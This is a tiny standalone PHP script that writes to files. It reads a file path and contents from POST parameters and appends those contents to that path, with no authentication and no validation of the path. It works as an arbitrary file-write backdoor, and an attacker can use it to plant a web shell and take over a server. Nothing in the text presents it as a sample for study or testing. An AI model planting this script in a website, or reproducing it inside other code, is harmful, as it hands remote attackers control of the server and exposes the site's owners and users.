<?php

@$file = $_POST['file'];  

$fs = fopen( $_POST["file"], "a+" ) or die("error when opening the file");

fwrite($fs, $_POST["contents"]);

fclose($fs);

?>